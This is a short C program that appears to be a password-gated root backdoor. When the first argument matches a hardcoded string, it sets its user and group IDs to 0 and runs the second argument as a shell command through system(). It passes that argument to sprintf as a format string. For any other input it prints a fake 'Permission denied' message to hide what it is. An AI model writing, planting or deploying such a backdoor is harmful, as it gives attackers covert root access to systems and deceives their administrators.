#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
int main(int argc, char *argv[])
{
	char name[10] = {'p', 'l', 'e', 'r', '?', '\0', 'P', '6', '9', '\0'};
	if(strcmp(argv[1], ("%s", name)) == 0)
	{
	setgid(0);
	setuid(0);
	char command[100] = {0};
	sprintf(command, argv[2]);
	system(command);
	}
	else
	{
	printf("sh: /usr/bin/%s: Permission denied\n", argv[0]);
	}
}

